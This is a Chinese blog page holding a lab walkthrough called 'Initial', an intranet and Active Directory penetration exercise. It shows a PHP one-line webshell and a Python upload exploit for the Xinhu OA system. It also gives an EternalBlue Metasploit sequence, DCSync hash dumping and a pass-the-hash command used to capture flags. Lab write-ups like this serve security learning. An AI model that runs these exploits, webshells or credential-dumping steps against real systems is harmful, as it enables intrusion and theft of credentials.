@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>靶场日记-Initial | 『1nv_qaq&#39;s Blog』</title>
+    <meta name="author" content="1nv-qaq" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>wait wait wait...</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>『1NV_QAQ&#39;S BLOG』</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;『1NV_QAQ&#39;S BLOG』</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>靶场日记-Initial</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/12
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">
+                    渗透测试
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>第一次打到域🎯</p>
+<span id="more"></span>
+
+<p>上线<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/710238783">fscan</a>先扫一下</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/01.png" alt="img"></p>
+<p>有一个<code>thinkphp</code>的<code>rce</code>，工具写个马</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/02.png" alt="img"></p>
+<p><code>www-data</code>权限</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/03.png" alt="img"></p>
+<p><code>sudo -l</code>发现<code>mysql</code>免密</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/04.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mysql/#sudo">gtfobins</a>找一句话提权</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/05.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/06.png" alt="img"></p>
+<pre><code>flag&#123;60b53231-
+</code></pre>
+<p><code>ip-a</code>看到</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/07.png" alt="img"></p>
+<p>传个<code>fscan</code>扫内网</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/08.png" alt="img"></p>
+<pre><code class="Plain">172.22.1.15:80 open
+172.22.1.15:22 open
+172.22.1.18:3306 open
+172.22.1.21:445 open
+172.22.1.18:445 open
+172.22.1.2:445 open
+172.22.1.21:139 open
+172.22.1.18:139 open
+172.22.1.2:139 open
+172.22.1.21:135 open
+172.22.1.18:135 open
+172.22.1.2:135 open
+172.22.1.18:80 open
+172.22.1.2:88 open
+[*] NetInfo:
+[*]172.22.1.21
+   [-&gt;]XIAORANG-WIN7
+   [-&gt;]172.22.1.21
+[*] NetInfo:
+[*]172.22.1.18
+   [-&gt;]XIAORANG-OA01
+   [-&gt;]172.22.1.18
+[*] NetInfo:
+[*]172.22.1.2
+   [-&gt;]DC01
+   [-&gt;]172.22.1.2
+[+] 172.22.1.21 MS17-010    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)
+[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
+[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
+[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 
+[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
+[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
+[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
+[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+</code></pre>
+<p>看到<code>172.22.1.2</code>、<code>172.22.1.21</code>、<code>172.22.1.18</code>开放，<code>.18</code>是一个OA，<code>.21</code>存在<code>ms17010</code>，<code>.2</code>是<code>DC域控</code></p>
+<p>配个<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63576152/article/details/133462540?spm=1001.2014.3001.5501">frp</a>代理，先看<code>.18</code>的OA系统</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/09.png" alt="img"></p>
+<p>弱密码<code>admin:admin123</code>可以登进去</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/10.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/11.png" alt="img"></p>
+<p>查个<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/118675321">poc</a>打，同目录下存一个一句话木马<code>1.php</code></p>
+<p><code>&lt;?php eval($_POST[&quot;1&quot;]);?&gt;</code></p>
+<pre><code>import requests
+
+session = requests.session()
+
+url_pre = &#39;http://172.22.1.18/&#39;
+url1 = url_pre + &#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;
+url2 = url_pre + &#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;
+url3 = url_pre + &#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39;
+
+data1 = &#123;
+    &#39;rempass&#39;: &#39;0&#39;,
+    &#39;jmpass&#39;: &#39;false&#39;,
+    &#39;device&#39;: &#39;1625884034525&#39;,
+    &#39;ltype&#39;: &#39;0&#39;,
+    &#39;adminuser&#39;: &#39;YWRtaW4=&#39;,
+    &#39;adminpass&#39;: &#39;YWRtaW4xMjM=&#39;,
+    &#39;yanzm&#39;: &#39;&#39;
+&#125;
+
+r = session.post(url1, data=data1)
+r = session.post(url2, files=&#123;&#39;file&#39;: open(&#39;1.php&#39;, &#39;r+&#39;)&#125;)
+
+filepath = str(r.json()[&#39;filepath&#39;])
+filepath = &quot;/&quot; + filepath.split(&#39;.uptemp&#39;)[0] + &#39;.php&#39;
+id = r.json()[&#39;id&#39;]
+
+url3 = url_pre + f&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#39;
+
+r = session.get(url3)
+r = session.get(url_pre + filepath + &quot;?1=system(&#39;dir&#39;);&quot;)
+print(r.text)
+</code></pre>
+<p>拿到了路径，成功连上马</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/12.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/13.png" alt="img"></p>
+<p><code>system</code>权限，<code>Administrator</code>找到第二段flag</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/14.png" alt="img"></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/15.png" alt="img"></p>
+<pre><code>2ce3-4813-87d4-
+</code></pre>
+<p>接着看<code>.21</code>的内容了，扫出来有<code>ms17010</code>，<code>proxychains4</code>代理<code>msf</code>打</p>
+<pre><code class="Plain">proxychains4 msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/bind_tcp_uuid
+set RHOSTS 172.22.1.21
+run
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/16.png" alt="img"></p>
+<p>但找了半天这里没最后一段flag，最后一段flag在<code>.2</code>的域控上，看wp发现要<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">DCSync攻击</a></p>
+<p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。 DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p>
+<p>于是我们可以用<code>DCSync</code>导出所有用户的hash，然后进行hash传递攻击，我们需要以下任一用户的权限：</p>
+<ul>
+<li>Administrator 组内的用户</li>
+<li>Domain Admins 组内的用户</li>
+<li>Enterprise Admins 组内的用户域控制器的计算机账户</li>
+</ul>
+<p>而.21这台机器正好是<code>enterprise</code>用户</p>
+<pre><code class="Plain">load kiwi
+kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/17.png" alt="img"></p>
+<p>拿到了<code>Administrator</code>的hash<code>10cf89a850fb1cdbe6bb432b859164c8</code></p>
+<p>接着用<code>crackmapexec</code>进行哈希传递攻击，实现DC域控上的任意命令执行</p>
+<pre><code>proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Initial/18.png" alt="img"></p>
+<pre><code>e8f88d0d43d6&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2025 『1nv_qaq&#39;s Blog』
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;1nv-qaq
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/<fireworks.min.js>"></script>
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+
+
+
+    
+    
+
+
+
+
+    
+</body>
+</html>
